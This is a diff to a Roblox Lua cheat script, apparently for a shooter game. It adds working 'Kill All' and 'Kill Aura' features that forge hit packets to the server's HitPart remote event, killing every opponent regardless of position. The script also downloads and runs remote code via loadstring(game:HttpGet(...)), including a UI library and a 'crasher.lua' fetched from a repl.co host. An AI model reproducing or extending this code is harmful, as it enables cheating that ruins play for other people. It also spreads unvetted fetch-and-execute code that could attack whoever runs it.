@@ -52,6 +52,8 @@ Client = {
         Sight = false,
         FOV = false,
         Golden = true,
+        Test = true,
+        Testt = true,
         Visiblecheck = false,
         SilentAim = false,
 
@@ -76,6 +78,88 @@ Config = {
     NoSpread = false
 }
 
+
+local d = {}
+local e = {}
+local f = {}
+local g = game:GetService("UserInputService")
+local h = Instance.new("BodyVelocity")
+local i = Instance.new("Animation", game.CoreGui)
+local j = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
+i.AnimationId = "rbxassetid://0"
+local k = game:GetObjects("rbxassetid://12328085159")[1]
+local l = false or false
+local m = "" .. math.random(1, 100000000)
+local n = "" .. math.random(1, 100000000)
+h.MaxForce = Vector3.new(math.huge, 0, math.huge)
+
+function d:RotationY(o)
+    local b, p, q = o:ToOrientation()
+    return CFrame.new(o.Position) * CFrame.Angles(0, p, 0)
+end
+function d:getplrsname()
+    for r, c in pairs(game:GetChildren()) do
+        if c.ClassName == "Players" then
+            return c.Name
+        end
+    end
+end
+function d:IsEmpty(c)
+    for s, c in pairs(c) do
+        if c ~= nil then
+            return false
+        end
+    end
+    return true
+end
+function d:Crash()
+    loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/crasher.lua"))()
+end
+function d:GetVolume()
+    return game.SoundService.WeaponDischarge.Volume
+end
+
+
+
+function d:KillPlayer(t)
+    if game:GetService("ReplicatedStorage").wkspc.Status.RoundOver.Value then
+        return
+    end
+    if not game.Players.LocalPlayer.Character:FindFirstChild("Spawned") then
+        return
+    end
+    local u = require(game:GetService("ReplicatedStorage").Modules.BitBuffer)()
+    u.writeString(game:GetService("Players").LocalPlayer.NRPBS.EquippedTool.Value)
+    u.writeUnsigned(2, 1)
+    u.writeUnsigned(2, 0)
+    u.writeInt8(1 + 0)
+    u.writeFloat16(50)
+    u.writeInt8(1)
+    u.writeUnsigned(1 + 0, 0)
+    u.writeUnsigned(1, 0)
+    u.writeVector3(t.Character.HumanoidRootPart.Position)
+    u.writeVector3(t.Character.HumanoidRootPart.Position)
+    return game.ReplicatedStorage.Events["" .. "\226\128\139HitPart"]:FireServer(
+        t.Character.HumanoidRootPart,
+        u.dumpString(),
+        "swaggg"
+    )
+end
+function d:GetFOV()
+    return game.Players.LocalPlayer.Settings.FOV.Value
+end
+function d:PrepareInit()
+    local v = {}
+    if game.Players.LocalPlayer.PlayerGui.Menew:FindFirstChild("TheMan") then
+        game.Players.LocalPlayer.PlayerGui.Menew.TheMan:Destroy()
+    end
+    if game.ReplicatedStorage:FindFirstChild("HitPart") then
+        game.ReplicatedStorage.HitPart:Destroy()
+    end
+end
+
+                
+            
 
 
 local CurrentCamera = workspace.CurrentCamera
@@ -578,10 +662,66 @@ local CombatTab=Window:Tab("Combat")
 local CombatTabMainSection=CombatTab:Section("Aimbot")
 
 
-CombatTabMainSection:Toggle("Kill All (soon)",function(x)
-    
-    end)
-CombatTabMainSection:Toggle("Kill Aura (soon)",function(x)
+
+CombatTabMainSection:Toggle("Kill All (Toggle Wallbang)",function(state)
+    Client.Toggles.Test = state
+end)
+spawn(function()
+    while true do
+        wait(.01)
+        if Client.Toggles.Test == true then
+        for s, c in next, game.Players:GetPlayers() do
+                    if game:GetService("ReplicatedStorage").wkspc.FFA.Value then
+                        if
+                            c.Character and c.Name ~= game.Players.LocalPlayer.Name and
+                                c.Character:FindFirstChild("Spawned")
+                         then
+                            for r = 1, 10 do
+                                d:KillPlayer(c)
+                            end
+                        end
+                    else
+                        if
+                            c.Character and c.Name ~= game.Players.LocalPlayer.Name and
+                                c.Character:FindFirstChild("Spawned") and
+                                c.TeamColor ~= game.Players.LocalPlayer.TeamColor
+                         then
+                            for r = 1, 10 do
+                                d:KillPlayer(c)
+                            end
+                        end
+                    end
+                end
+        --here
+        wait(0.1)
+        end
+    end
+end)
+
+
+
+
+
+
+CombatTabMainSection:Toggle("Kill Aura (Toggle Kill All On And Off To Work)",function(x)
+while true do wait(0.1)
+for r, c in pairs(game.Players:GetPlayers()) do
+                    if
+                        c and c ~= game.Players.LocalPlayer and c.Character and c.Character:FindFirstChild("Head") and
+                            c.Character:FindFirstChild("Spawned") and
+                            c.TeamColor ~= game.Players.LocalPlayer.TeamColor
+                     then
+                        local cG =
+                            (game.Players.LocalPlayer.Character.PrimaryPart.Position - c.Character.PrimaryPart.Position).magnitude
+                        if cG <= 12 then
+                            for r = 0, 5 do
+                                d:KillPlayer(c)
+                            end
+                        end
+                    end
+                end
+            
+end
 
 end)
 
